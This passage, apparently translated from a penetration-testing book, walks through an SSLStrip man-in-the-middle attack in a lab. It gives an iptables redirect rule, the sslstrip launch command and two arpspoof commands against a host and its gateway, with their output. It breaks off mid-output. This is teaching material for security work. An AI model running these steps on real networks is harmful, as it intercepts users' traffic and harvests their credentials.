  ## SSLStrip\n\n在过去，我可以在前一步停止并仅运行 tcpdump 来收集我需要的任何网站凭据。然而，随着大多数网站转向 SSL，我们需要一种解密主机之间通信的方法，以便我能清楚地看到这些信息。这就是\
  \ SSLStrip 将允许我们实现的目标。\n\n![](img/095df2cd1930baecbcecaa51ee3417aa_129_0.png)\n\n\
  随着越来越多的网站从 HTTP 转向 HTTPS，拦截和解密的需求将变得越来越重要。仍然有很多网站仍在运行 HTTP。根据 Google 最近的一项调查，HTTPS\
  \ 占到了流量的 30%。这很快将增加到 50% 以上。\n\nSSLStrip 是一种攻击工具，利用中间人功能透明地查看 HTTPS 流量、劫持它，并向用户返回未加密的\
  \ HTTP 链接。希望在这里是终端用户不会注意到流量不再加密，并认为自己是安全的而输入敏感信息。然而，实际上，`sslstrip` 正在收集所有这些敏感信息。让我们在实验室中设置并测试它。\n\
  \n在启动 `sslstrip` 之前，需要执行一些维护步骤。我们需要一种方法将通过 ARP 欺骗进入该设备的流量转发给 `sslstrip` 以执行其工作。为此，我将使用\
  \ iptables 将传入的 SSL 重定向到 `sslstrip` 将监听的端口。语法如下：\n\n```\niptables -t nat -A PREROUTING\
  \ -p tcp --destination-port 80 -j REDIRECT --to-port $LISTEN-PORT\n```\n\n一旦重定向全部设置好，我就可以启动\
  \ `sslstrip` 并确保指定在 iptables 中用于重定向的端口。您指定的日志文件将是所有收集信息最终存放的位置。\n\n这就是我在实验室中的设置方式。首先，我开始将流量重定向到\
  \ `sslstrip`，然后在正确的端口上启动 `sslstrip`：\n\n```bash\nroot@pi-kali:~# iptables -t nat\
  \ -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080\nroot@pi-kali:~#\
  \ sslstrip -l 8080\n\nsslstrip 0.9 by Moxie Marlinspike running...\n```\n\n接下来，我设置\
  \ arpspoof 通过欺骗以下屏幕截图所示的默认网关来进入流量，以便主机在发出时将流量发送给我：\n\n```\nroot@kali:~# arpspoof\
  \ -i eth0 -t 192.168.33.3 192.168.33.1\n0:c:29:f8:7b:ae 3c:15:c2:dc:2:b4 0806 42:\
  \ arp reply 192.168.33.1 is-at 0:c:29:f8:7b:ae\n0:c:29:f8:7b:ae 3c:15:c2:dc:2:b4\
  \ 0806 42: arp reply 192.168.33.1 is-at 0:c:29:f8:7b:ae\n0:c:29:f8:7b:ae 3c:15:c2:dc:2:b4\
  \ 0806 42: arp reply 192.168.33.1 is-at 0:c:29:f8:7b:ae\n0:c:29:f8:7b:ae 3c:15:c2:dc:2:b4\
  \ 0806 42: arp reply 192.168.33.1 is-at 0:c:29:f8:7b:ae\n0:c:29:f8:7b:ae 3c:15:c2:dc:2:b4\
  \ 0806 42: arp reply 192.168.33.1 is-at 0:c:29:f8:7b:ae\n0:c:29:f8:7b:ae 3c:15:c2:dc:2:b4\
  \ 0806 42: arp reply 192.168.33.1 is-at 0:c:29:f8:7b:ae\n0:c:29:f8:7b:ae 3c:15:c2:dc:2:b4\
  \ 0806 42: arp reply 192.168.33.1 is-at 0:c:29:f8:7b:ae\n0:c:29:f8:7b:ae 3c:15:c2:dc:2:b4\
  \ 0806 42: arp reply 192.168.33.1 is-at 0:c:29:f8:7b:ae\n0:c:29:f8:7b:ae 3c:15:c2:dc:2:b4\
  \ 0806 42: arp reply 192.168.33.1 is-at 0:c:29:f8:7b:ae\n0:c:29:f8:7b:ae 3c:15:c2:dc:2:b4\
  \ 0806 42: arp reply 192.168.33.1 is-at 0:c:29:f8:7b:ae\n0:c:29:f8:7b:ae 3c:15:c2:dc:2:b4\
  \ 0806 42: arp reply 192.168.33.1 is-at 0:c:29:f8:7b:ae\n0:c:29:f8:7b:ae 3c:15:c2:dc:2:b4\
  \ 0806 42: arp reply 192.168.33.1 is-at 0:c:29:f8:7b:ae\n```\n\n在我欺骗默认网关的同时，我也欺骗主机\
  \ IP 地址到默认网关，以便将返回流量发送给我：\n\n```\nroot@kali:~# arpspoof -i eth0 -t 192.168.33.1\
  \ 192.168.33.3\n0:c:29:f8:7b:ae e0:55:3d:77:4:b5 0806 42: arp reply 192.168.33.3\
  \ is-at 0:c:29:f8:7b:ae\n0:c:29:f8:7b:ae e0:55:3d:77:4:b5 0806 42: arp reply 192.168.33.3\
